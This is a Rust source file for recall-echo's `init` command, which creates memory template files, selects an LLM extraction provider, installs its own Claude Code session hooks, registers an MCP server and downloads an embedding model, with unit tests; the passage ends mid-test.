// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

//! Initialize the recall-echo memory system.
//!
//! Creates the directory structure and template files needed for four-layer
//! memory (graph, curated, short-term, long-term), picks an extraction
//! provider, installs Claude Code's hooks, registers the MCP server with every
//! agent CLI on the machine, and downloads the embedding model.
//!
//! # What `init` asks
//!
//! As little as it can get away with. Setup friction is what loses users, so
//! every question here has to earn itself:
//!
//! - one agent CLI installed — no question at all, that is the provider;
//! - several — one short menu, defaulted to the CLI the session is running
//!   under, because that is the subscription the user just proved they have;
//! - none — the full provider menu, since now the choice really is open.
//!
//! Nothing prompts unless stderr is a terminal ([`atty_check`]); a scripted or
//! piped install takes the same defaults without blocking.
//!
//! # What it does without asking
//!
//! Hooks, MCP registration and the model download are consequences of what is
//! installed, not preferences, so they happen. Each is idempotent, each reports
//! itself, and none of them can fail the command:
//!
//! - hooks are matched by command name, so re-running never duplicates one;
//! - MCP servers live in a map keyed by name in every client, so re-registering
//!   the same name is a no-op (see [`crate::agent_cli`]);
//! - the model is a content-addressed cache, so a second warm is a no-op.
//!
//! # The build-directory guard
//!
//! A binary under `target/debug` or `target/release` is a test harness or a
//! working copy, not something a user's hooks and MCP configs should be pinned
//! to for the life of the install. Everything that writes *outside* the entity
//! root — hooks, MCP registration — is skipped there, which is also what keeps
//! `cargo test` from repointing the developer's live tooling at a test binary
//! or downloading 127 MB per test.

use std::fs;
use std::io::{self, BufRead, Write as _};
use std::path::Path;

use crate::agent_cli::{self, AgentCli, McpReport, McpStatus};
use crate::config::{self, Config, LlmSection, Provider};
use crate::error::RecallError;
use crate::paths;
use crate::transcript::Source;

// ANSI color helpers
const GREEN: &str = "\x1b[32m";
const YELLOW: &str = "\x1b[33m";
const RED: &str = "\x1b[31m";
const BOLD: &str = "\x1b[1m";
const DIM: &str = "\x1b[2m";
const RESET: &str = "\x1b[0m";

const MEMORY_TEMPLATE: &str = "# Memory\n\n\
<!-- recall-echo: Curated memory. Distilled facts, preferences, patterns. -->\n\
<!-- Keep under 200 lines. Only write confirmed, stable information. -->\n";

const ARCHIVE_TEMPLATE: &str = "# Conversation Archive\n\n\
| # | Date | Session | Topics | Messages | Duration |\n\
|---|------|---------|--------|----------|----------|\n";

/// Roughly what the BGE-Small-EN-v1.5 ONNX weights weigh, for the one line
/// that tells the user why their terminal is busy.
const MODEL_DOWNLOAD_SIZE: &str = "~127 MB";

enum Status {
    Created,
    Exists,
    Error,
}

fn print_status(status: Status, msg: &str) {
    match status {
        Status::Created => eprintln!("  {GREEN}✓{RESET} {msg}"),
        Status::Exists => eprintln!("  {YELLOW}~{RESET} {msg}"),
        Status::Error => eprintln!("  {RED}✗{RESET} {msg}"),
    }
}

fn ensure_dir(path: &Path) {
    if !path.exists() {
        if let Err(e) = fs::create_dir_all(path) {
            print_status(
                Status::Error,
                &format!("Failed to create {}: {e}", path.display()),
            );
        }
    }
}

fn write_if_not_exists(path: &Path, content: &str, label: &str) {
    if path.exists() {
        print_status(
            Status::Exists,
            &format!("{label} already exists — preserved"),
        );
    } else {
        match fs::write(path, content) {
            Ok(()) => print_status(Status::Created, &format!("Created {label}")),
            Err(e) => print_status(Status::Error, &format!("Failed to create {label}: {e}")),
        }
    }
}

// ── Choosing an extraction provider ──────────────────────────────────────

/// Pick the provider that will turn conversations into knowledge.
///
/// `detected` is every agent CLI whose binary is on this machine, in
/// preference order. `None` means the user chose to configure it later.
fn select_provider(reader: &mut dyn BufRead, detected: &[AgentCli]) -> Option<Provider> {
    match detected {
        // Nothing to choose between: the answer is obvious, so do not ask it.
        [only] => {
            print_status(
                Status::Created,
                &format!("found {only} — using it for extraction"),
            );
            Some(only.provider())
        }
        [] => {
            eprintln!(
                "\n  {YELLOW}~{RESET} No agent CLI found. Extraction needs a model provider — \
                 {BOLD}ollama{RESET} is the free, local option."
            );
            prompt_any_provider(reader)
        }
        several => prompt_installed_cli(reader, several),
    }
}

/// The CLI a menu should default to: the one this session is running under,
/// else Claude Code, else the first installed.
fn default_cli(detected: &[AgentCli]) -> AgentCli {
    let running_under = agent_cli::current().filter(|cli| detected.contains(cli));
    running_under
        .or_else(|| {
            detected
                .contains(&AgentCli::ClaudeCode)
                .then_some(AgentCli::ClaudeCode)
        })
        .or_else(|| detected.first().copied())
        .unwrap_or(AgentCli::ClaudeCode)
}

/// Short menu over the CLIs that are actually installed.
fn prompt_installed_cli(reader: &mut dyn BufRead, detected: &[AgentCli]) -> Option<Provider> {
    let default = default_cli(detected);
    if !atty_check() {
        print_status(
            Status::Created,
            &format!(
                "{} agent CLIs found — using {default} for extraction",
                detected.len()
            ),
        );
        return Some(default.provider());
    }

    let default_index = detected.iter().position(|cli| *cli == default).unwrap_or(0) + 1;

    eprintln!("\n{BOLD}Which CLI should recall-echo use to extract knowledge?{RESET}");
    for (index, cli) in detected.iter().enumerate() {
        let note = if *cli == default {
            if agent_cli::current() == Some(*cli) {
                "— you're running under it (default)"
            } else {
                "— (default)"
            }
        } else {
            ""
        };
        eprintln!(
            "  {BOLD}{}{RESET}) {:<12}{DIM}{note}{RESET}",
            index + 1,
            cli.label()
        );
    }
    eprintln!("  {BOLD}o{RESET}) other       {DIM}— Claude API, Ollama, or decide later{RESET}");
    eprint!("\n  Choice [{default_index}]: ");
    io::stderr().flush().ok();

    let mut input = String::new();
    if reader.read_line(&mut input).is_err() {
        return Some(default.provider());
    }

    let answer = input.trim().to_lowercase();
    if answer.is_empty() {
        return Some(default.provider());
    }
    if answer == "o" || answer == "other" {
        return prompt_any_provider(reader);
    }
    if let Some(cli) = answer
        .parse::<usize>()
        .ok()
        .and_then(|n| detected.get(n.wrapping_sub(1)))
    {
        return Some(cli.provider());
    }
    if let Some(cli) = detected.iter().find(|cli| cli.label() == answer) {
        return Some(cli.provider());
    }
    eprintln!("  {YELLOW}~{RESET} Unknown choice, defaulting to {default}");
    Some(default.provider())
}

/// The full provider menu — every provider recall-echo speaks, installed or
/// not. Reached when nothing was detected, or when the user asks for it.
///
/// Returns `None` if the user chose to configure it later.
fn prompt_any_provider(reader: &mut dyn BufRead) -> Option<Provider> {
    if !atty_check() {
        return Some(Provider::Anthropic);
    }

    eprintln!("\n{BOLD}LLM provider for entity extraction:{RESET}");
    eprintln!("  {BOLD}1{RESET}) anthropic   {DIM}— Claude API (default){RESET}");
    eprintln!("  {BOLD}2{RESET}) ollama      {DIM}— Local models via Ollama, free{RESET}");
    eprintln!(
        "  {BOLD}3{RESET}) claude-code {DIM}— Spawns your `claude` CLI (subscription){RESET}"
    );
    eprintln!(
        "  {BOLD}4{RESET}) gemini      {DIM}— Spawns your `gemini` CLI (subscription){RESET}"
    );
    eprintln!("  {BOLD}5{RESET}) grok        {DIM}— Spawns your `grok` CLI (subscription){RESET}");
    eprintln!("  {BOLD}6{RESET}) codex       {DIM}— Spawns your `codex` CLI (subscription){RESET}");
    eprintln!(
        "  {BOLD}7{RESET}) skip        {DIM}— Configure later with `recall-echo config`{RESET}"
    );
    eprint!("\n  Choice [1]: ");
    io::stderr().flush().ok();

    let mut input = String::new();
    if reader.read_line(&mut input).is_err() {
        return None;
    }

    match input.trim() {
        "" | "1" | "anthropic" => Some(Provider::Anthropic),
        "2" | "ollama" => Some(Provider::Openai),
        "3" | "claude-code" => Some(Provider::ClaudeCode),
        "4" | "gemini" => Some(Provider::Gemini),
        "5" | "grok" => Some(Provider::Grok),
        "6" | "codex" => Some(Provider::Codex),
        "7" | "skip" => None,
        _ => {
            eprintln!("  {YELLOW}~{RESET} Unknown choice, defaulting to anthropic");
            Some(Provider::Anthropic)
        }
    }
}

/// Write `.recall-echo.toml` if there is none, and report the provider in
/// force either way. `None` means extraction is not configured.
fn configure_llm(
    reader: &mut dyn BufRead,
    memory_dir: &Path,
    detected: &[AgentCli],
) -> Option<Provider> {
    if config::exists(memory_dir) {
        print_status(
            Status::Exists,
            ".recall-echo.toml already exists — preserved",
        );
        return Some(config::load(memory_dir).llm.provider);
    }

    let Some(provider) = select_provider(reader, detected) else {
        print_status(
            Status::Exists,
            "Skipped LLM config — run `recall-echo config set provider <name>` later",
        );
        return None;
    };

    let cfg = Config {
        llm: LlmSection {
            provider: provider.clone(),
            ..LlmSection::default()
        },
        ..Config::default()
    };
    match config::save(memory_dir, &cfg) {
        Ok(()) => {
            print_status(
                Status::Created,
                &format!(
                    "Created .recall-echo.toml (provider: {})",
                    label_of(&provider)
                ),
            );
            Some(provider)
        }
        Err(e) => {
            print_status(Status::Error, &format!("Failed to write config: {e}"));
            None
        }
    }
}

/// The provider's name as a user knows it.
fn label_of(provider: &Provider) -> String {
    match provider {
        Provider::Openai => "ollama (openai-compat)".to_string(),
        other => other.to_string(),
    }
}

/// The provider's name plus what it will cost.
fn extraction_line(provider: &Provider) -> String {
    match provider {
        Provider::Anthropic => "anthropic (Claude API — set ANTHROPIC_API_KEY)".into(),
        Provider::Openai => "ollama (local models — free)".into(),
        Provider::Cli => "custom CLI (from `[llm.cli]`)".into(),
        cli => format!("{cli} (your subscription — no API billing)"),
    }
}

// ── Graph and embedding model ────────────────────────────────────────────

/// Initialize the graph store in memory/graph/.
fn init_graph(runtime: &tokio::runtime::Runtime, memory_dir: &Path) {
    let graph_dir = memory_dir.join("graph");
    if graph_dir.exists() {
        print_status(Status::Exists, "graph/ already exists — preserved");
        return;
    }

    match runtime.block_on(crate::graph::GraphMemory::open(&graph_dir)) {
        Ok(_) => print_status(Status::Created, "Created graph/ (SurrealDB)"),
        Err(e) => print_status(Status::Error, &format!("Failed to init graph: {e}")),
    }
}

/// What became of the embedding model.
#[derive(Debug, Clone, PartialEq, Eq)]
enum WarmOutcome {
    Ready,
    Skipped(&'static str),
    Failed(String),
}

/// Download and load the embedding model now, rather than on first use.
///
/// The first embedding a user ever asks for otherwise stalls for a ~127 MB
/// download with no explanation — the single most convincing way to look
/// broken. Doing it here, last and announced, makes it a setup step.
///
/// Interruptible: nothing after this point is required, so Ctrl-C leaves a
/// working install and the model downloads on first use instead. Failure is
/// reported and never fatal, so an offline install still succeeds.
fn warm_embedding_model(memory_dir: &Path) -> WarmOutcome {
    let exe = recall_binary();
    if is_build_dir(&exe) {
        return WarmOutcome::Skipped("running from a build directory");
    }

    let models_dir = memory_dir.join("graph").join("models");
    if let Err(e) = fs::create_dir_all(&models_dir) {
        return WarmOutcome::Failed(format!("could not create {}: {e}", models_dir.display()));
    }

    let cached = fs::read_dir(&models_dir).is_ok_and(|mut entries| entries.next().is_some());
    if cached {
        eprintln!("  {DIM}… loading the embedding model{RESET}");
    } else {
        eprintln!(
            "  {DIM}… downloading the embedding model ({MODEL_DOWNLOAD_SIZE}, once) — \
             everything else is already set up, Ctrl-C is safe{RESET}"
        );
    }

    match crate::graph::embed::FastEmbedder::new(&models_dir) {
        Ok(_) => WarmOutcome::Ready,
        Err(e) => WarmOutcome::Failed(e.to_string()),
    }
}

// ── Claude Code hooks ────────────────────────────────────────────────────

/// The recall-echo binary that hooks and MCP registrations should point at.
fn recall_binary() -> String {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.to_str().map(String::from))
        .unwrap_or_else(|| "recall-echo".into())
}

/// True when this binary lives in a Cargo build directory.
///
/// Such a path is a test harness or a working copy, and pinning a user's hooks
/// or MCP config to it would break the moment the tree is cleaned.
fn is_build_dir(exe: &str) -> bool {
    exe.contains("/target/debug/") || exe.contains("/target/release/")
}

/// Auto-configure Claude Code hooks (settings.json).
/// Returns true if hooks were configured.
/// Hooks always go in ~/.claude/settings.json regardless of where entity_root is.
fn configure_hooks(entity_root: &Path) -> bool {
    let claude_dir = match paths::detect_claude_code() {
        Some(dir) => dir,
        None => return false,
    };

    let settings_path = claude_dir.join("settings.json");
    let recall_bin = recall_binary();

    // A path under target/ is a test harness or a debug build, not something
    // a user's hooks should be pinned to for the life of the install.
    if is_build_dir(&recall_bin) {
        print_status(
            Status::Exists,
            "Skipped hook install — running from a build directory",
        );
        return false;
    }

    // Absent means a fresh install. Unreadable or unparseable means the
    // user's existing configuration — falling back to `{}` there would
    // overwrite everything they have (permissions, MCP servers, env) with a
    // file containing nothing but these hooks.
    let mut settings: serde_json::Value = if settings_path.exists() {
        let content = match fs::read_to_string(&settings_path) {
            Ok(c) => c,
            Err(e) => {
                print_status(
                    Status::Error,
                    &format!(
                        "Could not read {} ({e}) — hooks not configured",
                        settings_path.display()
                    ),
                );
                return false;
            }
        };
        match serde_json::from_str(&content) {
            Ok(v) => v,
            Err(e) => {
                print_status(
                    Status::Error,
                    &format!(
                        "{} is not valid JSON ({e}) — refusing to overwrite it; \
                         fix the file and re-run init",
                        settings_path.display()
                    ),
                );
                return false;
            }
        }
    } else {
        serde_json::json!({})
    };

    let root = fs::canonicalize(entity_root).unwrap_or_else(|_| entity_root.to_path_buf());
    // A control character (a newline especially) inside a shell command line
    // is unrecoverable for the user reading settings.json later.
    if root.display().to_string().chars().any(char::is_control) {
        print_status(
            Status::Error,
            "Entity root contains control characters — refusing to write it into a shell hook",
        );
        return false;
    }

    let mut skipped: Vec<String> = Vec::new();
    let changed = match upsert_recall_hooks(&mut settings, &recall_bin, &root, &mut skipped) {
        Some(changed) => changed,
        None => {
            print_status(Status::Error, "Could not parse settings.json hooks");
            return false;
        }
    };
    for note in &skipped {
        print_status(Status::Exists, note);
    }

    if changed {
        match serde_json::to_string_pretty(&settings) {
            Ok(content) => match write_settings_atomically(&settings_path, &content) {
                Ok(()) => {
                    print_status(
                        Status::Created,
                        "Configured SessionStart + SessionEnd + PreCompact hooks in settings.json",
                    );
                    return true;
                }
                Err(e) => print_status(
                    Status::Error,
                    &format!("Failed to write settings.json: {e}"),
                ),
            },
            Err(e) => print_status(Status::Error, &format!("Failed to serialize settings: {e}")),
        }
    } else {
        print_status(Status::Exists, "Hooks already configured in settings.json");
        return true;
    }

    false
}

/// Replace settings.json without a window where it is truncated or absent.
///
/// The previous content is kept as `settings.json.bak`; the new content lands
/// via a temp file and rename, keeping the original file's permissions — the
/// file can hold permission allowlists and credentials, so its mode is not
/// ours to loosen.
fn write_settings_atomically(path: &Path, content: &str) -> std::io::Result<()> {
    if path.exists() {
        let _ = fs::copy(path, path.with_extension("json.bak"));
    }
    let tmp = path.with_extension("json.tmp");
    fs::write(&tmp, content)?;
    if let Ok(meta) = fs::metadata(path) {
        let _ = fs::set_permissions(&tmp, meta.permissions());
    }
    fs::rename(&tmp, path)
}

/// Quote a path for use inside a shell hook command line.
///
/// Always single-quoted: POSIX single quotes disable every expansion — `$`,
/// backticks, `;`, `|`, spaces — and an embedded `'` is closed, escaped, and
/// reopened. Quoting only "when needed" is how metacharacters slip through.
fn shell_path(path: &Path) -> String {
    format!("'{}'", path.display().to_string().replace('\'', r"'\''"))
}

/// Shell operators whose presence marks a hook command as hand-customized.
///
/// The canonical commands this installer writes contain none of these, so a
/// recall-echo hook that does — `recall-echo archive-session || true`, a
/// `timeout` wrapper, a chained cleanup — was shaped by the user on purpose,
/// and rewriting it would silently destroy that intent.
const SHELL_OPERATORS: [&str; 9] = [";", "&&", "||", "|", ">", "<", "$(", "`", "\n"];

/// Install or repair the three recall-echo hooks in a settings.json value.
///
/// The entity root is baked into every command: hooks run with the harness's
/// cwd, which is wherever the user happens to be working, and a bare
/// `recall-echo archive-session` resolves against that — capture then only
/// works when the shell sits in the entity root. MCP registration already
/// bakes the root for reads; this is the write-side counterpart.
///
/// A hook whose command matches a known recall-echo subcommand but not the
/// expected command line — the bare pre-4.2 form, or a different root — is
/// rewritten in place, so re-running `init` repairs a broken install instead
/// of declaring it present. Two kinds of hooks are never rewritten: ones
/// that are not recall-echo's at all, and recall-echo hooks carrying shell
/// operators (see [`SHELL_OPERATORS`]) — those are user customizations, and
/// each one skipped is reported through `skipped`.
///
/// Returns `Some(changed)`, or `None` when the settings shape is unusable.
fn upsert_recall_hooks(
    settings: &mut serde_json::Value,
    recall_bin: &str,
    entity_root: &Path,
    skipped: &mut Vec<String>,
) -> Option<bool> {
    let root = shell_path(entity_root);
    // SessionStart fires once per session (startup or resume) — injects
    // EPHEMERAL.md into context via stdout. Skips `clear` (user reset) and
    // `compact` (we just recovered from a compaction, no prior session to
    // surface). `consume` takes the root positionally.
    let plan: [(&str, Option<&str>, &str, String); 3] = [
        (
            "SessionStart",
            Some("startup|resume"),
            "recall-echo consume",
            format!("{recall_bin} consume {root}"),
        ),
        (
            "SessionEnd",
            None,
            "recall-echo archive-session",
            format!("{recall_bin} archive-session --entity-root {root}"),
        ),
        (
            "PreCompact",
            None,
            "recall-echo checkpoint",
            format!("{recall_bin} checkpoint --trigger precompact --entity-root {root}"),
        ),
    ];

    let hooks = settings.as_object_mut().and_then(|o| {
        o.entry("hooks")
            .or_insert_with(|| serde_json::json!({}))
            .as_object_mut()
    })?;

    let mut changed = false;
    for (event, matcher, marker, expected) in plan {
        match upsert_hook(hooks, event, matcher, marker, &expected, skipped) {
            Some(true) => changed = true,
            Some(false) => {}
            None => return None,
        }
    }
    Some(changed)
}

/// Ensure one event carries the expected recall-echo hook command.
///
/// Every recall-echo hook under the event is considered: exact matches stand,
/// operator-carrying customizations are reported and left alone, anything
/// else (the bare legacy form, a stale root) is rewritten in place. A group
/// holding only our rewritten hook also gets its matcher synced. When no
/// recall-echo hook exists at all, a new group is appended.
///
/// Returns `Some(changed)`, or `None` when the event's value is not an array
/// — someone else's structure, not ours to repair or append to.
fn upsert_hook(
    hooks: &mut serde_json::Map<String, serde_json::Value>,
    event: &str,
    matcher: Option<&str>,
    marker: &str,
    expected: &str,
    skipped: &mut Vec<String>,
) -> Option<bool> {
    let mut changed = false;
    let mut found = false;

    if let Some(value) = hooks.get_mut(event) {
        let arr = value.as_array_mut()?;
        for group in arr.iter_mut() {
            let Some(inner) = group.get_mut("hooks").and_then(|h| h.as_array_mut()) else {
                continue;
            };
            let group_size = inner.len();
            let mut group_has_ours = false;
            for hook in inner.iter_mut() {
                let Some(cmd) = hook.get("command").and_then(|c| c.as_str()) else {
                    continue;
                };
                // Match on the base command name, not the full path.
                if !cmd.contains(marker) {
                    continue;
                }
                found = true;
                if cmd == expected {
                    group_has_ours = true;
                    continue;
                }
                if SHELL_OPERATORS.iter().any(|op| cmd.contains(op)) {
                    skipped.push(format!(
                        "{event}: left a customized recall-echo hook unchanged: {cmd}"
                    ));
                    continue;
                }
                hook["command"] = serde_json::Value::String(expected.to_string());
                group_has_ours = true;
                changed = true;
            }
            // Sync the matcher only when the group is exactly our hook —
            // a shared group's matcher governs foreign hooks too.
            if group_has_ours && group_size == 1 {
                if let Some(m) = matcher {
                    if group.get("matcher").and_then(|v| v.as_str()) != Some(m) {
                        group["matcher"] = serde_json::Value::String(m.to_string());
                        changed = true;
                    }
                }
            }
        }
    }

    if found {
        return Some(changed);
    }

    let arr = hooks
        .entry(event)
        .or_insert_with(|| serde_json::json!([]))
        .as_array_mut()?;
    let mut group = serde_json::json!({
        "hooks": [{"type": "command", "command": expected}]
    });
    if let Some(m) = matcher {
        group["matcher"] = serde_json::Value::String(m.to_string());
    }
    arr.push(group);
    Some(true)
}

// ── MCP registration ─────────────────────────────────────────────────────

/// Register the MCP server with every agent CLI on the machine.
///
/// Without this the graph is read-only in theory and unread in practice: the
/// server exists, and every user has to find the `mcp add` line in the README
/// to reach it. Doing it here means memory is queryable from the next session
/// on, in every client the user already has.
fn register_mcp_clients(
    runtime: &tokio::runtime::Runtime,
    detected: &[AgentCli],
    entity_root: &Path,
) -> Vec<McpReport> {
    if detected.is_empty() {
        return Vec::new();
    }

    let exe = recall_binary();
    if is_build_dir(&exe) {
        print_status(
            Status::Exists,
            "Skipped MCP registration — running from a build directory",
        );
        return Vec::new();
    }

    let root = fs::canonicalize(entity_root).unwrap_or_else(|_| entity_root.to_path_buf());
    let reports: Vec<McpReport> = runtime.block_on(async {
        let mut reports = Vec::with_capacity(detected.len());
        for cli in detected {
            reports.push(agent_cli::register_mcp(*cli, &exe, &root).await);
        }
        reports
    });

    for report in &reports {
        match &report.status {
            McpStatus::Registered => print_status(
                Status::Created,
                &format!("Registered MCP server with {}", report.cli),
            ),
            McpStatus::AlreadyRegistered => print_status(
                Status::Exists,
                &format!("MCP server already registered with {}", report.cli),
            ),
            McpStatus::Failed(detail) => {
                print_status(
                    Status::Error,
                    &format!("Could not register MCP with {}: {detail}", report.cli),
                );
                eprintln!("    {DIM}run it yourself: {}{RESET}", report.command);
            }
        }
    }
    reports
}

// ── Summary ──────────────────────────────────────────────────────────────

/// Everything `init` decided, as the closing summary needs it.
struct Summary {
    memory_dir: std::path::PathBuf,
    provider: Option<Provider>,
    capture: Vec<Source>,
    mcp: Vec<McpReport>,
    embedder: WarmOutcome,
}

impl Summary {
    /// Clients that will be able to query memory over MCP.
    fn mcp_ready(&self) -> Vec<&'static str> {
        self.mcp
            .iter()
            .filter(|report| !matches!(report.status, McpStatus::Failed(_)))
            .map(|report| report.cli.label())
            .collect()
    }
}

/// Tell the user what will now happen without them doing anything.
fn print_summary(summary: &Summary) {
    eprintln!("\n{BOLD}Setup complete.{RESET}\n");
    print_status(
        Status::Created,
        &format!("memory initialised at {}", summary.memory_dir.display()),
    );

    match &summary.provider {
        Some(provider) => print_status(
            Status::Created,
            &format!("extraction: {}", extraction_line(provider)),
        ),
        None => print_status(
            Status::Exists,
            "extraction: not configured — `recall-echo config set provider <name>`",
        ),
    }

    if summary.capture.is_empty() {
        print_status(
            Status::Exists,
            "capture: no agent CLI has recorded sessions here yet",
        );
    } else {
        let names: Vec<&str> = summary.capture.iter().map(Source::as_str).collect();
        print_status(Status::Created, &format!("capture: {}", names.join(", ")));
    }

    let ready = summary.mcp_ready();
    if !ready.is_empty() {
        print_status(
            Status::Created,
            &format!("MCP registered: {}", ready.join(", ")),
        );
    }

    match &summary.embedder {
        WarmOutcome::Ready => print_status(Status::Created, "embedding model ready"),
        WarmOutcome::Skipped(reason) => print_status(
            Status::Exists,
            &format!("embedding model not warmed ({reason}) — downloads on first use"),
        ),
        WarmOutcome::Failed(detail) => print_status(
            Status::Exists,
            &format!("embedding model not downloaded ({detail}) — retries on first use"),
        ),
    }

    eprintln!("\n  {BOLD}Your next session will be remembered.{RESET}\n");
    eprintln!("  {DIM}recall-echo status       — is it healthy, what has it got{RESET}");
    eprintln!("  {DIM}recall-echo config show  — what it decided{RESET}");
    eprintln!();
}

/// Check if stderr is a terminal (for interactive prompts).
fn atty_check() -> bool {
    use std::io::IsTerminal;
    std::io::stderr().is_terminal()
}

// ── Entry point ──────────────────────────────────────────────────────────

/// Initialize memory structure at the given entity root.
///
/// Creates:
/// ```text
/// {entity_root}/memory/
/// ├── MEMORY.md
/// ├── EPHEMERAL.md
/// ├── ARCHIVE.md
/// ├── .recall-echo.toml
/// ├── graph/
/// └── conversations/
/// ```
pub fn run(entity_root: &Path) -> Result<(), RecallError> {
    let stdin = io::stdin();
    let mut reader = stdin.lock();
    run_with_reader(entity_root, &mut reader)
}

/// Testable init with injectable reader.
pub fn run_with_reader(entity_root: &Path, reader: &mut dyn BufRead) -> Result<(), RecallError> {
    if !entity_root.exists() {
        return Err(RecallError::NotInitialized(format!(
            "Directory not found: {}\n  Create the directory first, or run from a valid path.",
            entity_root.display()
        )));
    }

    eprintln!("\n{BOLD}recall-echo{RESET} — initializing memory system\n");

    let memory_dir = entity_root.join("memory");
    let conversations_dir = memory_dir.join("conversations");
    ensure_dir(&memory_dir);
    ensure_dir(&conversations_dir);

    // Write MEMORY.md (never overwrite)
    write_if_not_exists(&memory_dir.join("MEMORY.md"), MEMORY_TEMPLATE, "MEMORY.md");

    // Write EPHEMERAL.md (never overwrite)
    write_if_not_exists(&memory_dir.join("EPHEMERAL.md"), "", "EPHEMERAL.md");

    // Write ARCHIVE.md (never overwrite)
    write_if_not_exists(
        &memory_dir.join("ARCHIVE.md"),
        ARCHIVE_TEMPLATE,
        "ARCHIVE.md",
    );

    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build();
    let runtime = match runtime {
        Ok(runtime) => Some(runtime),
        Err(e) => {
            print_status(Status::Error, &format!("Failed to start runtime: {e}"));
            None
        }
    };

    if let Some(runtime) = &runtime {
        init_graph(runtime, &memory_dir);
    }

    let detected = agent_cli::installed();
    let provider = configure_llm(reader, &memory_dir, &detected);

    // Hooks are Claude Code's capture mechanism, not a consequence of the
    // extraction provider: a user who extracts with grok still wants their
    // Claude Code sessions archived. `configure_hooks` no-ops when Claude Code
    // is not installed.
    configure_hooks(entity_root);

    let mcp = match &runtime {
        Some(runtime) => register_mcp_clients(runtime, &detected, entity_root),
        None => Vec::new(),
    };

    // Last, so an interrupted download costs nothing already done.
    let embedder = warm_embedding_model(&memory_dir);

    print_summary(&Summary {
        memory_dir,
        provider,
        capture: agent_cli::capturing(),
        mcp,
        embedder,
    });

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Cursor;

    /// Init under `cargo test` runs from `target/debug/deps/…`, which is what
    /// keeps these tests off the developer's real hooks, MCP configs and
    /// network. Assert it, so a change in harness layout fails here rather
    /// than by rewriting someone's settings.json.
    #[test]
    fn the_test_binary_is_recognised_as_a_build_directory() {
        assert!(
            is_build_dir(&recall_binary()),
            "test binary should be treated as a build directory: {}",
            recall_binary()
        );
        assert!(!is_build_dir("/usr/local/bin/recall-echo"));
        assert!(!is_build_dir("/home/d/.cargo/bin/recall-echo"));
    }

    #[test]
    fn init_creates_directories_and_files() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().to_path_buf();
        let mut reader = Cursor::new(b"skip\n" as &[u8]); // skip provider prompt

        run_with_reader(&root, &mut reader).unwrap();

        assert!(root.join("memory/MEMORY.md").exists());
        assert!(root.join("memory/EPHEMERAL.md").exists());
        assert!(root.join("memory/ARCHIVE.md").exists());
        assert!(root.join("memory/conversations").exists());
    }

    #[test]
    fn init_is_idempotent() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().to_path_buf();
        let mut reader = Cursor::new(b"skip\n" as &[u8]);

        run_with_reader(&root, &mut reader).unwrap();
        fs::write(root.join("memory/MEMORY.md"), "custom content").unwrap();

        let mut reader2 = Cursor::new(b"skip\n" as &[u8]);
        run_with_reader(&root, &mut reader2).unwrap();
        let content = fs::read_to_string(root.join("memory/MEMORY.md")).unwrap();
        assert_eq!(content, "custom content");
    }

    /// A second `init` must not re-run the provider prompt or rewrite the
    /// config the user has since edited.
    #[test]
    fn a_second_init_preserves_the_configured_provider() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().to_path_buf();
        let memory_dir = root.join("memory");
        fs::create_dir_all(&memory_dir).unwrap();

        let chosen = configure_llm(
            &mut Cursor::new(b"" as &[u8]),
            &memory_dir,
            &[AgentCli::Grok],
        );
        assert_eq!(chosen, Some(Provider::Grok));

        // Empty reader: a prompt here would take the default and lose grok.
        let again = configure_llm(
            &mut Cursor::new(b"" as &[u8]),
            &memory_dir,
            &[AgentCli::ClaudeCode, AgentCli::Codex],
        );
        assert_eq!(again, Some(Provider::Grok));
    }

    #[test]
    fn init_fails_if_root_missing() {
        let mut reader = Cursor::new(b"" as &[u8]);
        let result = run_with_reader(Path::new("/nonexistent/path"), &mut reader);
        assert!(result.is_err());
    }

    /// One installed CLI is not a choice, so it is not a question — the reader
    /// is never touched.
    #[test]
    fn a_single_installed_cli_is_chosen_without_asking() {
        let mut reader = Cursor::new(b"" as &[u8]);
        assert_eq!(
            select_provider(&mut reader, &[AgentCli::Codex]),
            Some(Provider::Codex)
        );
        assert_eq!(reader.position(), 0, "nothing should have been read");
    }

    /// Non-interactive (the tests, and any scripted install): pick the default
    /// rather than block on a prompt nobody can answer.
    #[test]
    fn several_installed_clis_default_without_blocking() {
        let mut reader = Cursor::new(b"" as &[u8]);
        let chosen = select_provider(&mut reader, &[AgentCli::Grok, AgentCli::Codex]);
        assert_eq!(chosen, Some(Provider::Grok));
    }

    #[test]
    fn the_default_prefers_claude_code_over_install_order() {
        assert_eq!(
            default_cli(&[AgentCli::Codex, AgentCli::ClaudeCode]),
            AgentCli::ClaudeCode
        );
        assert_eq!(
            default_cli(&[AgentCli::Gemini, AgentCli::Grok]),
            AgentCli::Gemini
        );
        assert_eq!(default_cli(&[]), AgentCli::ClaudeCode);
    }

    #[test]
    fn no_installed_cli_falls_back_to_the_full_menu() {
        let mut reader = Cursor::new(b"" as &[u8]);
        assert_eq!(select_provider(&mut reader, &[]), Some(Provider::Anthropic));
    }

    #[test]
    fn the_summary_names_the_cost_of_each_provider() {
        assert!(extraction_line(&Provider::Grok).contains("no API billing"));
        assert!(extraction_line(&Provider::Anthropic).contains("ANTHROPIC_API_KEY"));
        assert!(extraction_line(&Provider::Openai).contains("free"));
    }

    #[test]
    fn the_summary_lists_only_the_clients_that_registered() {
        let summary = Summary {
            memory_dir: std::path::PathBuf::from("/tmp/memory"),
            provider: Some(Provider::Grok),
            capture: vec![Source::Grok],
            mcp: vec![
                McpReport {
                    cli: AgentCli::ClaudeCode,
                    status: McpStatus::Registered,
                    command: String::new(),
                },
                McpReport {
                    cli: AgentCli::Grok,
                    status: McpStatus::AlreadyRegistered,
                    command: String::new(),
                },
                McpReport {
                    cli: AgentCli::Gemini,
                    status: McpStatus::Failed("no".into()),
                    command: String::new(),
                },
            ],
            embedder: WarmOutcome::Ready,
        };
        assert_eq!(summary.mcp_ready(), ["claude-code", "grok"]);
    }

    fn upsert(settings: &mut serde_json::Value, root: &str) -> (bool, Vec<String>) {
        let mut skipped = Vec::new();
        let changed = upsert_recall_hooks(
            settings,
            "/usr/local/bin/recall-echo",
            Path::new(root),
            &mut skipped,
        )
        .unwrap();
        (changed, skipped)
    }

    #[test]
